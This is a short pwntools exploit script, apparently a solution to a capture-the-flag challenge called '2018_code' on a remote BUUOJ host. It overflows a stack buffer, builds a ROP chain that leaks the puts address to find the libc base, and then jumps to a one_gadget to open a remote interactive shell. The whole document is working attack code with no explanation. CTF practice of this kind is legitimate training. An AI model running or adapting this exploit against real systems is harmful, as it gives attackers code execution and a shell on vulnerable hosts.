from pwn import *

r = remote('node3.buuoj.cn',28170)
libc = ELF('/libc-2.27.so')
elf = ELF('./2018_code')
r.sendline('wyBTs')
r.recvuntil('to save')
payload = 'a'*0x78+p64(0x400983)+p64(elf.got['puts'])+p64(0x400570)+p64(0x400801)
r.sendline(payload)
r.recvuntil('Success\n')
leak = u64(r.recv(6).ljust(8,'\x00'))
libc_base = leak-libc.sym['puts']
payload='a'*0x78+p64(libc_base+0x4f322)
r.sendline(payload)
r.interactive()
